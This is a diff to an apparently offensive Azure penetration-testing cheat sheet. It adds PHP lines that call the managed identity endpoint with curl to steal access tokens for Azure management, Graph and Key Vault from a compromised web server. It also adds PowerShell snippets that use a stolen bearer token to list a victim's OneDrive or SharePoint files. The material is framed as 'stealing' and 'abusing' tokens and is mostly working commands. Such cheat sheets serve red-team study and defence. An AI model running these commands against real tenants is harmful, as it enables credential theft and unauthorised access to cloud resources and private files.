@@ -932,9 +932,6 @@ az storage account list
 #### Stealing tokens with tools
 - https://github.com/thalpius/Microsoft-JSON-Web-Token-Extractor
 
-#### Request tokens from the CLI!
-- Check below for example in using tokens!
-
 ### Stealing token scripts
 #### Python
 - Example: Run following code when compromising an webserver with a service principal for the webapp
@@ -967,6 +964,10 @@ print("ClientID: "+json.loads(val)["client_id"])
 <?php 
 
 system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
+
+system('curl "$IDENTITY_ENDPOINT?resource=https://graph.windows.net/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
+
+system('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
 
 ?>
 ```
@@ -1057,6 +1058,28 @@ $RequestParams = @{
  }
 }
 (Invoke-RestMethod @RequestParams).value 
+```
+
+### SharePoint
+#### Request SharePoint with access token
+```
+$Token = <TOKEN>
+$URi = 'https://graph.microsoft.com/v1.0/me/drive/root/children'
+$RequestParams = @{
+Method = 'GET'
+Uri = $URI
+Headers = @{ 'Authorization' = "Bearer $Token" } }
+(Invoke-RestMethod @RequestParams).value
+```
+
+```
+$Token = <TOKEN>
+$URi = 'https://graph.microsoft.com/v1.0/me/drive/root:/MyPAT:/children'
+$RequestParams = @{
+Method = 'GET'
+Uri = $URI
+Headers = @{ 'Authorization' = "Bearer $Token" } }
+(Invoke-RestMethod @RequestParams).value
 ```
 
 ### Abusing tokens
